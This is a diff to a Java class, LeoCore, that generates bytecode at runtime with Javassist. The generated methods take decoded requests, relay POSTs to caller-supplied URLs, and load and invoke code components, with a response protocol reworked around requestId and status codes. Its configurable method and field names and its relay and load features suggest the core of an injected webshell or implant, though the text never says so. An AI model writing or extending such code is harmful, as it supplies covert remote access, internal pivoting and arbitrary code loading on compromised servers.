@@ -97,8 +97,8 @@ public class LeoCore {
         {
             CtMethod redirect = CtNewMethod.make("" +
                                                  "private void " + config.getMethodRedirect() + "(java.util.HashMap dataMap) throws Exception {\n" +
-                                                 "        String rUrl= (String) dataMap.get(\"rUrl\");\n" +
-                                                 "        java.net.URL u = new java.net.URL(rUrl);\n" +
+                                                 "        String url= (String) dataMap.get(\"url\");\n" +
+                                                 "        java.net.URL u = new java.net.URL(url);\n" +
                                                  "        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();\n" +
                                                  "        conn.setRequestMethod(\"POST\");\n" +
                                                  "        conn.setConnectTimeout(3000);\n" +
@@ -144,8 +144,9 @@ public class LeoCore {
                                                  "        int length;\n" +
                                                  "        while ((length = inputStream.read(var4)) != -1) {\n" +
                                                  "            result.write(var4, 0, length);\n" + "        }\n" +
-                                                 "        " + config.getFieldResults() + ".put(\"reqUrl\",rUrl);\n" +
-                                                 "        " + config.getFieldResults() + ".put(\"respData\",result.toByteArray());\n" +
+                                                 "        " + config.getFieldResults() + ".put(\"url\",url);\n" +
+                                                 "        " + config.getFieldResults() + ".put(\"body\",result.toByteArray());\n" +
+                                                 "        " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(200));\n" +
                                                  "    }", ctClass);
 
             ctClass.addMethod(redirect);
@@ -165,19 +166,39 @@ public class LeoCore {
         //action
         {
             CtMethod action = CtNewMethod.make("private void " + config.getMethodAction() + "() throws Exception {\n" +
-                                               "        java.lang.Integer var1 = (java.lang.Integer)this." + config.getFieldParams() + ".get(\"M\");\n" +
-                                               "        if (var1.equals(Integer.valueOf(0))) {\n" +
-                                               "            this." + config.getMethodTestConn() + "();\n" +
-                                               "        }\n" +
-                                               "        if (var1.equals(Integer.valueOf(1))) {\n" +
-                                               "            this." + config.getMethodRedirect() + "(this." + config.getFieldParams() + ");\n" +
-                                               "        }\n" +
-                                               "        if (var1.equals(Integer.valueOf(2)) && (this." + config.getFieldParams() + ".get(\"hostId\").equals(" + config.getFieldHostId() + "))) {\n" +
-                                               "            this." + config.getMethodLoadComponent() + "();\n" +
-                                               "        }\n" +
-                                               "        if (var1.equals(Integer.valueOf(3)) && (this." + config.getFieldParams() + ".get(\"hostId\").equals(" + config.getFieldHostId() + "))) {\n" +
-                                               "            this." + config.getMethodInvokeComponent() + "();\n" +
-                                               "        }\n" +
+                                               "        java.util.HashMap var0 = this." + config.getFieldParams() + ";\n" +
+                                               "        String var1 = (String)var0.get(\"operation\");\n" +
+                                               "        Object var9 = var0.get(\"requestId\");\n" +
+                                               "        java.util.HashMap var7 = new java.util.HashMap();\n" +
+                                               "        Object var6 = var0.get(\"params\");\n" +
+                                               "        if (var6 instanceof java.util.Map) var7.putAll((java.util.Map)var6);\n" +
+                                               "        if (var0.get(\"hostId\") != null) var7.put(\"hostId\", var0.get(\"hostId\"));\n" +
+                                               "        if (var0.get(\"component\") != null) var7.put(\"componentName\", var0.get(\"component\"));\n" +
+                                               "        if (var0.get(\"action\") != null) var7.put(\"action\", var0.get(\"action\"));\n" +
+                                               "        this." + config.getFieldParams() + " = var7;\n" +
+                                               "        if (\"PING\".equals(var1)) this." + config.getMethodTestConn() + "();\n" +
+                                               "        else if (\"RELAY\".equals(var1)) this." + config.getMethodRedirect() + "(var7);\n" +
+                                               "        else if ((\"COMPONENT_LOAD\".equals(var1) || \"COMPONENT_INVOKE\".equals(var1))\n" +
+                                               "                && !" + config.getFieldHostId() + ".equals(var7.get(\"hostId\"))) {\n" +
+                                               "            this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(403));\n" +
+                                               "        } else if (\"COMPONENT_LOAD\".equals(var1)) this." + config.getMethodLoadComponent() + "();\n" +
+                                               "        else if (\"COMPONENT_INVOKE\".equals(var1)) this." + config.getMethodInvokeComponent() + "();\n" +
+                                               "        else this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(404));\n" +
+                                               "        java.util.HashMap var8 = this." + config.getFieldResults() + ";\n" +
+                                               "        Object var5 = var8.remove(\"code\");\n" +
+                                               "        int var4 = var5 instanceof Number ? ((Number)var5).intValue() : 500;\n" +
+                                               "        java.util.HashMap var3 = new java.util.HashMap();\n" +
+                                               "        var3.put(\"requestId\", var9);\n" +
+                                               "        var3.put(\"code\", Integer.valueOf(var4));\n" +
+                                               "        if (var4 >= 200 && var4 < 300) {\n" +
+                                               "                var3.put(\"data\", var8);\n" +
+                                               "            } else {\n" +
+                                               "                Object var2 = var8.remove(\"msg\");\n" +
+                                               "                if (var2 == null) var2 = var8.remove(\"message\");\n" +
+                                               "                if (var2 != null) var8.put(\"message\", var2);\n" +
+                                               "                var3.put(\"error\", var8);\n" +
+                                               "            }\n" +
+                                               "        this." + config.getFieldResults() + " = var3;\n" +
                                                "    }", ctClass);
 
             ctClass.addMethod(action);
@@ -190,12 +211,19 @@ public class LeoCore {
                                                "        }\n" +
                                                "        this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
                                                "        java.io.ByteArrayOutputStream var2 = (java.io.ByteArrayOutputStream)var1;\n" +
+                                               "        Object var10 = null;\n" +
                                                "        try {\n" +
                                                "            this." + config.getFieldParams() + " = this.decode(var2.toByteArray());\n" +
+                                               "            var10 = this." + config.getFieldParams() + ".get(\"requestId\");\n" +
                                                "            this." + config.getMethodAction() + "();\n" +
                                                "        } catch (Exception e) {\n" +
-                                               "            " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(500));\n" +
-                                               "            " + config.getFieldResults() + ".put(\"msg\",e.getMessage());\n" +
+                                               "            java.util.HashMap var11 = new java.util.HashMap();\n" +
+                                               "            java.util.HashMap var12 = new java.util.HashMap();\n" +
+                                               "            if (e.getMessage() != null) var12.put(\"message\", e.getMessage());\n" +
+                                               "            var11.put(\"requestId\", var10);\n" +
+                                               "            var11.put(\"code\", Integer.valueOf(500));\n" +
+                                               "            var11.put(\"error\", var12);\n" +
+                                               "            this." + config.getFieldResults() + " = var11;\n" +
                                                "        }\n" +
                                                "        try {\n" +
                                                "            var2.reset();\n" +
